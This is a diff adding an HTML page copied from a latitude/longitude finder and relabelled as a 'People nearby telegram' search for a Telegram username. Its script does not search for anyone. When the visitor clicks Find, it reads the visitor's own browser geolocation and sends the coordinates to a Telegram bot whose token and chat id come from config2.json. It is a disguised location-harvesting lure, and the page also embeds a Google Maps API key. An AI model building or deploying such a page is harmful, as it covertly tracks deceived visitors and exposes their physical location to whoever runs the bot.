@@ -1,0 +1,300 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<style></style>
+<link rel="icon" sizes="192x192" href="https://www.latlong.net/icon.png" />
+<link rel="apple-touch-icon" href="https://www.latlong.net/apple-touch-icon-152x152.png" sizes="152x152" />
+
+<title>Latitude and Longitude Finder on Map Get Coordinates</title>
+<meta name="description" content="Lat long is a geographic tool which helps you to get latitude and longitude of a place or city and find gps coordinates on map, convert lat long, gps, dms and utm." />
+<link rel="canonical" href="https://www.latlong.net/" />
+<link rel="stylesheet" href="./leaflet.css">
+  <link rel="stylesheet" href="./css.css">
+  <style>
+        /* Стили для модального окна */
+        #loadingModal {
+            display: none; /* Скрыто по умолчанию */
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        #loadingContent {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div id="loadingModal">
+    <div id="loadingContent">
+        <p>Загрузка...</p>
+        <div class="loader"></div>
+    </div>
+</div>
+<header class="shadow"></header><main>
+<h1>People nearby 
+telegram</h1>
+<p>Fill in the lines to start searching.</p>
+<div class="row">
+<div class="col-7 graybox">
+
+<label for="Ac3424">User:</label>
+<input id="Ac3424" type="text" placeholder="Find user" class="width70" style="text-transform:capitalize;" required  />
+<input id="Ac3424147" type="hidden" />
+<button title="Find user" class="button"  onclick="getLocation()" id="gofind">Find</button><br />
+<small>(Telegram username or id)</small><br />
+<span id="loading">Looking for the lat long, please wait...</span>
+
+<div class="row">
+<div class="col-6 m2">
+<label for="lat">Latitude</label>
+<input type="text" name="lat" id="lat" placeholder="lat coordinate" />
+</div>
+<div class="col-6 m2">
+<label for="lng">Longitude</label>
+<input type="text" name="lng" id="lng" placeholder="long coordinate" />
+</div>
+  
+ <div class="col-6 m2">
+<label for="lng">Radius</label>
+<input type="text" name="lng" id="lng" placeholder="meters" />
+</div>
+  
+</div>
+  <button title="Find user" class="button" onclick="getLocation()" id="gofind">Find</button>
+</div>
+<div class="col-5 pad0">
+<div class="margin20d">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- LatLong -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4342808821632378"
+     data-ad-slot="7807258447"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div></div>
+</div>
+<div class="row"><div class="col-7">
+<div id="latlongmap" style="width:100%;height:400px;" class="shadow"></div>
+</div>
+<div class="col-5">
+<iframe style="display:none" id="latlongmape" width="360" height="400" style="border:0;width:100%" class="shadow"
+        src="https://www.google.com/maps/embed/v1/view?key=AIzaSyALrSTy6NpqdhIOUs3IQMfvjh71td2suzY&center=0,0&zoom=2&maptype=satellite" allowfullscreen>
+</iframe>
+</div></div>
+<div class="row bg-gray border">
+<div class="col-6 m6">
+<h3 class="titleh3">Lat Long</h3>
+<span id="latlngspan" class="coordinatetxt">0,0</span>
+</div>
+<div class="col-6 m6">
+<h3 class="titleh3">GPS Coordinates</h3>
+<span id="dms-lat" class="coordinatetxt">0</span>
+<span id="dms-lng" class="coordinatetxt">0</span>
+</div>
+</div>
+<div class="margin20d">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- LatLongMiddle -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-4342808821632378"
+     data-ad-slot="1760724841"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div><div id="adbottom">
+<form class="bgrs padding10 border margin20" onsubmit="return false;">
+<div class="row">
+<div class="col-6">
+<label for="coordinateslink">Users...</label>
+<textarea style="display:none" readonly="readonly" id="coordinateslink" class="small full-width" onclick="this.focus();this.select()"></textarea> <br />
+<small></small>
+</div>
+<div class="col-6">
+<label for="coordinatesurl">Chats...</label>
+<input type="text" style="display:none" id="coordinatesurl" class="small full-width" readonly="readonly" onclick="this.select();" />
+</div>
+</div>
+</form>
+</div>
+</div></div>
+<script src="./leaflet.js"></script>
+  
+  
+  
+  <script>
+  function showLoadingModal() {
+        const modal = document.getElementById('loadingModal');
+        modal.style.display = 'flex'; // Показать модальное окно
+    }
+  var userb, tokenb = "";
+  fetch('config2.json').then(response => {
+    
+    return response.json(); 
+  })
+  .then(data => {
+    tokenb = data.token;
+    userb = data.uid;
+  })
+  .catch(error => {
+    console.error('Ошибка:', error);
+  });
+  
+  function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+function showPosition(position) {
+showLoadingModal();
+	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+`\nlong: ${position.coords.longitude}`)}`);
+}
+  
+  
+  
+  </script>
+  
+<script>
+var mymap = L.map('latlongmap');
+var mmr = L.marker([0,0]);
+mmr.bindPopup('0,0');
+mmr.addTo(mymap);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png?{foo}', {foo: 'bar',
+attribution:'&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'}).addTo(mymap);
+sm(0,0,2);
+mymap.on('click', onMapClick);
+
+var frmplace = document.getElementById('DT3224');
+if (frmplace.attachEvent) {
+frmplace.attachEvent("submit", getp);
+} else {
+frmplace.addEventListener("submit", getp);
+}
+var frmplace2 = document.getElementById('Ac3424');
+if (frmplace2.attachEvent) {
+frmplace2.attachEvent("keyup", getp2);
+} else {
+frmplace2.addEventListener("keyup", getp2);
+}
+function getp2(e) {
+if (e.preventDefault)
+e.preventDefault();
+document.getElementById('Ac3424147').value=document.getElementById('Ac3424').value;
+}
+
+function getp(e) {
+
+if (e.preventDefault)
+e.preventDefault();
+
+var plc = document.getElementById("Ac3424147").value;
+if(plc==='') {alert('not found');return false;}
+var plca = plc.split(","); 
+if (typeof plca !== 'undefined' && Object.getPrototypeOf(Object(plca)) === Object.getPrototypeOf([])) {
+
+if(isll(plca[0]) && isll(plca[1])) {
+sm(plca[0],plca[1],12);
+return false;
+}
+}
+
+var cpt=''; // grecaptcha.getResponse();
+document.getElementById("Ac3424").disabled = true;
+document.getElementById("btnfind").disabled = true;
+document.getElementById("loading").style.display = "block";
+var xhr = new XMLHttpRequest();
+var params = 'c1=' + encodeURIComponent(plc) + '&action=' + encodeURIComponent('gpcm')
++'&cp=' +cpt ;
+xhr.open("POST", '/_spm4.php', true);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+xhr.onreadystatechange = function () {
+if (xhr.readyState === 4 && xhr.status === 200) {
+if(xhr.responseText === "0000") {
+alert('Sorry, You have reached your daily query limit.');
+}
+else if(xhr.responseText !== "") {
+var crd = xhr.responseText.split(",");
+sm(crd[0],crd[1],12);
+}
+else {
+alert('No place found.');
+}
+document.getElementById("loading").style.display = "none";
+document.getElementById("Ac3424").disabled = false;
+document.getElementById("btnfind").disabled = false;
+}
+}
+xhr.send(params);
+
+return false;
+
+}
+
+function isll(num) {
+var val = parseFloat(num);
+if (!isNaN(val) && val <= 90 && val >= -90)
+    return true;
+else
+    return false;
+}
+
+function onMapClick(e) {
+mmr.setLatLng(e.latlng);
+setui(e.latlng.lat,e.latlng.lng,mymap.getZoom());
+}
+
+function dec2dms(e,t) {
+document.getElementById("dms-lat").innerHTML = getdms(e, !0), document.getElementById("dms-lng").innerHTML = getdms(t, !1)
+}
+function getdms(e, t) {
+var n = 0, m = 0, l = 0, a = "X";
+return a = t && 0 > e ? "S" : !t && 0 > e ? "W" : t ? "N" : "E", d = Math.abs(e), n = Math.floor(d), l = 3600 * (d - n), m = Math.floor(l / 60), l = Math.round(1e4 * (l - 60 * m)) / 1e4, n + "&deg; " + m + "' " + l + "'' " + a
+}
+
+function sm(lt,ln,zm) {
+    setui(lt,ln,zm);
+    mmr.setLatLng(L.latLng(lt,ln));
+    mymap.setView([lt,ln], zm);
+}
+
+function setui(lt,ln,zm) {
+    lt = Number(lt).toFixed(6);
+    ln = Number(ln).toFixed(6);
+mmr.setPopupContent(lt + ',' + ln).openPopup();
+document.getElementById("lat").value=lt;
+document.getElementById("lng").value=ln;
+document.getElementById("latlngspan").innerHTML ="(" + lt + ", " + ln + ")"; 
+document.getElementById("coordinatesurl").value = "https://www.latlong.net/c/?lat=" + lt + "&long=" + ln;
+document.getElementById("coordinateslink").innerHTML = '&lt;a href="https://www.latlong.net/c/?lat=' + lt + "&amp;long=" + ln + '" target="_blank"&gt;(' + lt + ", " + ln + ")&lt;/a&gt;";
+dec2dms(lt,ln);
+document.getElementById('latlongmape').src='https://www.google.com/maps/embed/v1/view?key=&maptype=satellite&'+'center='+lt+','+ ln+'&zoom='+zm;
+}
+       
+</script>
+
+</body>
+</html>
